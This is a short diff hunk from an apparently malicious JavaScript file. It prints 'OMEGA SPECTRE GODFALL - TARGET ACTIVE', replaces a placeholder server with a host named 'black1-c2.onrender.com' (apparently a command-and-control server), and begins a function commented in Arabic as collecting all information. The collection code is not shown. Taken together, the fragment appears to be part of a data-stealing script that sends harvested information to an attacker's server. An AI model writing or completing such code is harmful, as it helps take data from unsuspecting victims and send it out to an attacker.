@@ -5,7 +5,7 @@
 (function() {
     console.log("🔥 OMEGA SPECTRE GODFALL - TARGET ACTIVE");
     
-    const SERVER = 'https://your-app.onrender.com'; // ← غيّر هذا إلى رابط Render الخاص بك
+    const SERVER = 'https://black1-c2.onrender.com'; // ← غيّر هذا إلى رابط Render الخاص بك
     
     // ===== جمع جميع المعلومات =====
     function collectAllData() {
